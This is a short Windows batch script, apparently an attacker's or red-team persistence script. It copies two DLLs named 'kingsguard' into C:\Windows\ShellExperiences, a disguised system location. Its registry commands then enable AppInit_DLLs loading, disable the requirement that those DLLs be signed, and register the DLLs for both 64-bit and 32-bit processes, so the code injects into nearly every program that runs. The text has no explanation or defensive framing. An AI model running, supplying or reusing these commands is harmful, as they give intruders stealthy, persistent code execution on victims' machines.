move C:\users\administrator\desktop\kingsguard.dll C:\windows\shellexperiences 
move C:\users\administrator\desktop\kingsguard32.dll C:\windows\shellexperiences
reg add "hklm\software\microsoft\windows nt\currentversion\windows" /v LoadAppInit_DLLs /t reg_dword /d 1 /f
reg add "hklm\software\microsoft\windows nt\currentversion\windows" /v RequireSignedAppInit_DLLs /t reg_dword /d 0 /f
reg add "hklm\software\microsoft\windows nt\currentversion\windows" /v AppInit_DLLs /t reg_sz /d "C:\Windows\ShellExperiences\kingsguard.dll" /f
reg add "hklm\software\wow6432node\microsoft\windows nt\currentversion\windows" /v RequireSignedAppInit_DLLs /t reg_dword /d 0 /f
reg add "hklm\software\wow6432node\microsoft\windows nt\currentversion\windows" /v AppInit_DLLs /t reg_sz /d "C:\Windows\ShellExperiences\kingsguard32.dll" /f
reg add "hklm\software\wow6432node\microsoft\windows nt\currentversion\windows" /v LoadAppInit_DLLs /t reg_dword /d 1 /f
